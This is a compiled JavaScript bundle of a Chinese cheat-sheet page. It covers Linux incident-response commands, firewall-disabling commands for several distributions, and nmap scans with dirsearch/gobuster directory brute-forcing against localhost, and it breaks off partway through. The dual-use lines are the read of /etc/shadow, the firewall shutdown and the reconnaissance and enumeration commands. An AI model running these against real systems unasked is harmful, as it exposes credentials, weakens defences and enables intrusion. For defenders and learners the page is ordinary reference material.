"use strict";(self.webpackChunksuidx=self.webpackChunksuidx||[]).push([[781],{3974(s,i,a){a.r(i),a.d(i,{comp:()=>t,data:()=>e});var n=a(3990);const l={},t=(0,a(4932).A)(l,[["render",function(s,i){return(0,n.uX)(),(0,n.CE)("div",null,[...i[0]||(i[0]=[(0,n.Fv)('<h2 id="linux应急" tabindex="-1"><a class="header-anchor" href="#linux应急"><span>Linux 应急</span></a></h2><div class="language-sh line-numbers-mode" data-highlighter="shiki" data-ext="sh" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sh"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 查看Linux中占用资源情况</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">top</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> %CPU</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># cpu占用前5的信息</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -eo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> pid,ppid,%mem,%cpu,cmd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --sort=-%cpu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">head</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 5</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 查看网络通信的情况</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsof</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -PnR</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 寻找pid对应的进程</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> aux</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [pid]</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 查看进程打开的文件</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsof</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [pid]</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 查看网络和端口情况</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">netstat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -utnpl</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 显示进程和端口的对应关系</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lsof</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> :[port]</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 某个pid对应的文件路径</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -l</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /proc/[pid]/exe</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /proc/[pid]/exe</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 使用iptables屏蔽ip</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -A</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> INPUT/OUTPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -s/d</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [目标ip] -j ACCEPT/DROP</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 用iptables封锁和x.com的域名通信</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">iptables</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -I</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> INPUT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tcp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --dport</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 80</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -m</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> string</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;x.com&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --algo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> bm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -j</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> DROP</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 进行对比两个进程</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ef</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{print}&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sort</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">uniq</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">1</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /proc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sort</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">uniq</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">2</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">diff</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 特殊权限文件查找</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">.jsp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -perm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4777</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 被入侵的系统，肯定有文件被改动，通过比较文件的md5，创建时间，文件路径</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -uid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -print</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 查找特权文件</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> +10000k</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -print</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;...&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -print</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">md5sum</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -b</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [文件名]</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">whereis</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [文件名]</span></span>\n<span class="line"></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 账号检查</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">w</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # 查看系统信息</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/passwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 用户信息文件</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/shadow</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 用户密码</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">less</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/passwd</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -l</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/passwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 查看文件修改时间</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">usermod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [user] 锁定用户 -U 解锁用户</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">userdel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [user] 删除用户</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">userdel</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -r</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [user] 删除用户和他的home</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 用户登录检查</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">last</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">lastb</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="防火墙相关" tabindex="-1"><a class="header-anchor" href="#防火墙相关"><span>防火墙相关</span></a></h2><div class="language-sh line-numbers-mode" data-highlighter="shiki" data-ext="sh" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sh"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Ubuntu / Debian </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ufw</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> disable</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># CentOS / Fedora / RHEL </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> firewalld</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> firewalld</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Arch Linux </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># openSUSE </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SuSEfirewall2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> disable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SuSEfirewall2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#  Gentoo </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> rc-update</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> delete</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> default</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/init.d/iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Slackware </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/rc.d/rc.firewall</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Alpine Linux </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /etc/init.d/iptables</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> stop</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> rc-update</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> del</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> iptables</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="爆破常用" tabindex="-1"><a class="header-anchor" href="#爆破常用"><span>爆破常用</span></a></h2><div class="language-sh line-numbers-mode" data-highlighter="shiki" data-ext="sh" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sh"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 端口扫描:</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --min-rate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 127.0.0.1</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Pn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --min-rate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 10000</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 127.0.0.1</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sT</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sV</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -O</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p80,139</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 127.0.0.1</span></span>\n<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">TARGET</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">127.0.0.1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">nmap</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p- --min-rate=1000 -T4 </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$TARGET</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Pn </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ^[0-9]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> cut</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -d </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;/&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f 1 </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> tr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;\\n&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;,&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> sed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> s/,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">//</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">)</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sC</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -sV</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -Pn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -vvv</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $TARGET</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -oN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> nmap_tcp_all.nmap</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 目录爆破:</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">dirsearch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> zip,jar,tar.gz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --wordlists=/usr/share/dirb/wordlists/common.txt</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">dirsearch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -x</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 403</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">dirsearch</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 403,401</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/wordlists/dirb/big.txt</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gobuster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 50</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gobuster</span><span 